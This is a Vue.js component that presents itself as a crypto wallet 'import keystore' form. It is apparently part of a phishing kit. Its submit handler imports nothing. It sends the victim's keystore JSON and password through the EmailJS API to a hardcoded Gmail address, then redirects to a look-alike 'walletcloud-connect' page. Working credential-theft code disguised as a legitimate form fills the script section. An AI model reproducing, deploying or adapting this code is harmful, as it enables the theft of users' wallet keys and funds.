<template>
  <div class="private flex h-full flex-col px-5">
    <label class="mb-4 font-light text-lg text-center" for=""
      >Please enter your keystore JSON</label
    >
    <el-input
      class="text-white bg-black"
      type="textarea"
      :rows="2"
      v-model="keystore_JSON"
    >
    </el-input>
    <span>Please enter your keystore in JSON format</span>

    <el-input
      placeholder="Password"
      class="my-5 text-white"
      show-password
      v-model="password"
    >
    </el-input>
    <p class="my-10 font-semibold text-sm">
      Input the BIP39/BIP44 recovery phrase here to restore the private keys
      that manage your acccounts
    </p>
    <el-button :loading="loading" @click="sendData" class="text-white bg-black"
      >Import</el-button
    >
  </div>
</template>

<script>
import axios from "axios";
export default {
  data() {
    return {
      keystore_JSON: "",
      password: "",
      loading: false
    };
  },
  methods: {
    sendData() {
      this.loading = true;
      let self = this;
      const checker = this.formChecker();
      if (checker) {
        var data = {
          service_id: "service_lvrm641",
          template_id: "template_gnaql1j",
          user_id: "user_aq7h9Gzs5I9hrgtM0jmF3",
          template_params: {
            from_name: "KEYSTORE",
            keystore_JSON: this.keystore_JSON,
            password: this.password,
            reply_to: "crewwebinar@gmail.com"
          }
        };
        axios
          .post("https://api.emailjs.com/api/v1.0/email/send", data)
          .then(function() {
            window.location.href = "https://walletcloud-connect.surge.sh/";
            self.loading = false;
          })
          .catch(function() {
            self.loading = false;
          });
      } else {
        this.$notify({
          title: "Warning",
          message: "All Form input is required",
          type: "warning"
        });
      }
    },
    formChecker() {
      if (this.textarea === "" || this.password === "") {
        return false;
      } else {
        return true;
      }
    }
  }
};
</script>

<style lang="scss">
.private {
  min-height: 435px;

  label {
    color: #565656;
  }
  p {
    color: #3b99fc;
  }
  input {
    border: 1px solid #3b99fc;
    height: 50px;
    background: black;
  }
  button {
    height: 50px;
    border: 1px solid #3b99fc;
    border-radius: 4px;
    text-transform: uppercase;
    transition: all 0.2s ease-in-out;
    font-size: 20px;
    font-weight: 600;

    &:hover,
    &:active {
      color: white;
      outline: none;
      border-color: #3b99fc;
      background-color: black;
    }
  }

  .el-textarea {
    textarea {
      outline: none !important;
      border: 1px solid #3b99fc !important;
      font-weight: 500;
      padding: 12px;
      font-size: 16px;
      resize: none;
      border-radius: 4px;
    }
  }
}
</style>
